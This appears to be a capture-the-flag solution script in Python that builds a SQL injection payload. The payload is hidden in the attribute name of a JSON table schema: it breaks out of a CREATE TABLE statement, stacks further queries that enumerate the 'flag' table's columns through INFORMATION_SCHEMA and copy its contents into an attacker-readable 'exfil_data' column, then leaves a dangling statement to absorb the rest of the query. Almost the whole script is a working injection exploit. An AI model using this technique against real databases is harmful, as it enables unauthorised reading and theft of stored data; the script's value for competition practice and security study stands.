from json import dumps

SCHEMA_TYPES = {
    1: "INT",
    2: "CHAR(255)",
    3: "BOOL"
}

# BASE_DB = "cloudtable"
BASE_DB = "Main"

# Normal Schema
# schema = {
#     # Attr Name: Attr Type in Number
#     "name": 2,
#     "password": 2,
#     "isAdmin": 3
# }

table2IControl = {
    # Attr Name: Attr Type in Number
    "exfil_data": 2,
}

otherTable = "control_table"
alterTable = f" ALTER TABLE {otherTable} MODIFY exfil_data TEXT;"
getFlagTableSchema = f" INSERT INTO `{BASE_DB}`.`{otherTable}` (exfil_data) SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flag';"
exfiltration = f" INSERT INTO `{BASE_DB}`.`{otherTable}` (exfil_data) SELECT GROUP_CONCAT(flag SEPARATOR ',') FROM {BASE_DB}.flag;"
ending = f" CREATE TABLE `{BASE_DB}`.randomT2ByRetrO9(`test"

schema = {
    # Attr Name: Attr Type in Number
    f"exfil_data` TEXT);{exfiltration}{ending}": 1,
}

info_arr = schema.keys()

create_sql_tmpl = f"CREATE TABLE `{BASE_DB}`.`randomTableName`("
for i in info_arr:
    create_sql_tmpl += f"`{i}` {SCHEMA_TYPES[int(schema[i])]},"
create_sql_tmpl = create_sql_tmpl[:-1] + ");"

print(create_sql_tmpl, end="\n\n\n")

print(dumps(schema))